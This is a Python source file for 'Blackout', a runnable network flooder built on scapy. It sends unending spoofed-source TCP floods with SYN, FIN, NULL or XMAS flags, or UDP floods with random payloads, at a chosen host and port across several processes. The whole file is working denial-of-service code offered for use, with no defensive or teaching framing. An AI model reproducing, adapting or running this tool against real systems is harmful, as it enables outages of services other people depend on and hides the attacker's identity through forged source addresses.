"""
MIT License

Copyright (c) 2025 0xf0xy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from scapy.all import IP, TCP, UDP, send
from multiprocessing import Process
import random
import socket

RED = "\033[1;31m"
GREEN = "\033[1;32m"
BLUE = "\033[1;34m"
RESET = "\033[0m"


class Blackout:
    """
    Blackout: Raw packet network flooder.
    """

    def __init__(self):
        """
        Initialize Blackout instance and flags map.
        """
        self.flags_map = {"SYN": "S", "FIN": "F", "NULL": "", "XMAS": "FPU"}

    def tcp_flood(self, target: str, port: int, flag: str):
        """
        Launch an infinite TCP flood with a specified TCP flag.

        Args:
            target (str): Destination IP address.
            port (int): Destination port number.
            flag (str): TCP flag type.
        """

        while True:
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            ip = IP(src=src_ip, dst=target)
            tcp = TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags=self.flags_map[flag],
            )

            packet = ip / tcp

            send(packet, verbose=False)
            print(f"Sent packet: {src_ip} {GREEN}➜{RESET} {target}:{port}")

    def udp_flood(self, target: str, port: int):
        """
        Launch an infinite UDP flood.

        Args:
            target (str): Destination IP address.
            port (port): Destination port number.
        """
        while True:
            src_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
            ip = IP(src=src_ip, dst=target)
            udp = UDP(sport=random.randint(1024, 65535), dport=port)
            payload = random.SystemRandom().randbytes(1024)

            packet = ip / udp / payload

            send(packet, verbose=False)
            print(f"Sent packet: {src_ip} {GREEN}➜{RESET} {target}:{port}")

    def run(self, target: str, port: int, flag: str, threads: int = 1):
        """
        Run the flood attack against a target using multiprocessing.

        Args:
            target (str): Destination IP address.
            port (int): Destination port.
            flag (str): TCP flag used in TCP floods.
            threads (int): Number of threads to use for the flood.
        """
        try:
            target = socket.gethostbyname(target)

        except socket.gaierror:
            print(f"{RED}x{RESET} Could not resolve host: {target}")
            return

        print(
            f"{BLUE}*{RESET} Starting {BLUE}{flag}{RESET} flood against {BLUE}{target}:{port}{RESET}"
        )
        print(f"{BLUE}*{RESET} Press {BLUE}Ctrl+C{RESET} to stop the flood.\n")

        processes = []
        try:
            for _ in range(threads):
                if flag == "UDP":
                    p = Process(target=self.udp_flood, args=(target, port))

                else:
                    p = Process(target=self.tcp_flood, args=(target, port, flag))

                processes.append(p)
                p.start()

            for p in processes:
                p.join()

        except KeyboardInterrupt:
            for p in processes:
                p.terminate()

            print(f"\r\033[K\n{GREEN}+{RESET} Flooding stopped by user.")
